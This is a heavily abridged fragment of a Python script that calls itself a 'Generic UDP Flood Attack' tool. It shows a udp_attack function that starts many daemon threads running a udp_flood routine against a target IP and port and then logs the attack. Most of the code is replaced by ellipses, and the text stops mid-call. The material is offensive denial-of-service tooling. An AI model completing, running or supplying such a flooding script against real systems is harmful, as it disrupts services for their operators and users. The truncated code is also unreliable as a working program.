#!/usr/bin/env python3
# Generic UDP Flood Attack with Real-time Live Logs
...
def udp_attack():
    ...
    for _ in range(threads):
        t = threading.Thread(target=udp_flood, args=(ip, port, stop_event, stats))
        t.daemon = True
        t.start()
    ...
    try:
        ...
        save_log(ip, port, "UDP_FLOOD", threads, duration, 
